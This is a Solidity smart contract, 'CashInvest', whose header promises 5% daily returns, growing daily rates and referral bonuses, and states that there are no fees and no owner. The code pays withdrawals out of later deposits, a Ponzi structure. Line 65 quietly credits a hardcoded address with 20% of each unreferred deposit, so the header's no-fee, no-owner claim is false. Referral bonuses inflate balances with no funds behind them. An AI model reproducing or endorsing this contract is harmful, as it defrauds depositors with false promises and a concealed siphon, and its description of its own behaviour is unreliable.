1 /**
2  *
3  *  Cash Investment Contract
4  *  - GAIN 5% PER 24 HOURS (every 5900 blocks)
5  *  - Every day the percentage increases by 0.25%
6  *  - You will receive 10% of each deposit of your referral
7  *  - Your referrals will receive 10% bonus
8  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
9  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
10  *
11  * How to use:
12  *  1. Send any amount of ether to make an investment
13  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
14  *  OR
15  *  2b. Send more ether to reinvest AND get your profit at the same time
16  *
17  * RECOMMENDED GAS LIMIT: 100000
18  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
19  * 
20  *
21  */
22 contract CashInvest {
23     // records amounts invested
24     mapping (address => uint256) invested;
25     // records blocks at which investments were made
26     mapping (address => uint256) atBlock;
27     
28     function bytesToAddress(bytes bys) private pure returns (address addr) {
29         assembly {
30             addr := mload(add(bys, 20))
31         }
32     }
33 
34     // this function called every time anyone sends a transaction to this contract
35     function ()  payable {
36           
37             
38         if (invested[msg.sender] != 0) {
39             // calculate profit amount as such:
40             // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900
41             // 5900 is an average block count per day produced by Ethereum blockchain
42             uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
43             
44             amount +=amount*((block.number - 6550501)/118000);
45             // send calculated amount of ether directly to sender (aka YOU)
46             address sender = msg.sender;
47             
48              if (amount > address(this).balance) {sender.send(address(this).balance);}
49              else  sender.send(amount);
50             
51         }
52         
53          
54 
55         // record block number and invested amount (msg.value) of this transaction
56         atBlock[msg.sender] = block.number;
57         invested[msg.sender] += msg.value;
58         //referral
59          address referrer = bytesToAddress(msg.data);
60             if (invested[referrer] > 0 && referrer != msg.sender) {
61                 invested[msg.sender] += msg.value/10;
62                 invested[referrer] += msg.value/10;
63             
64             } else {
65                 invested[0xA8A297C1aC6a11c2118173ba976eA2D45Cc82188] += msg.value/5;
66             }
67         
68         
69        
70     }
71 }